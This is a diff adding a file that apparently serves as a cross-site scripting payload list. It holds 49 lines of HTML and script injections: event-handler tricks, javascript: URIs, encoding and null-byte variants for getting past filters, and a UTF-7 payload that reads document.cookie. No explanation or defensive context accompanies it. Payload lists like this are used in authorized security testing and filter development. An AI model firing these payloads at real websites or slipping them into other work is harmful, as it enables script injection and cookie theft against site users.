@@ -1,0 +1,49 @@
+<xml onreadystatechange=alert(1)>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<input type=image src=valid.gif onreadystatechange=alert(1)>
+<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+</a onmousemove=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<form id=test /><button form=test formaction=javascript:alert(1)>
+<event-source src=javascript:alert(1)>
+<img/onerror=alert(1) src=a>
+<img[%09]onerror=alert(1) src=a>
+<img[%0d]onerror=alert(1) src=a>
+<img[%0a]onerror=alert(1) src=a>
+<img/”onerror=alert(1) src=a>
+<img/’onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+<script/anyjunk>alert(1)</script>
+<img o[%00]nerror=alert(1) src=a>
+<img src=`a`onerror=alert(1)>
+<img/onerror=”alert(1)”src=a>
+<img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+%253cimg%20onerror=alert(1)%20src=a%253e
+<<script>alert(1);//<</script>
+<script<{alert(1)}/></script>
++ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
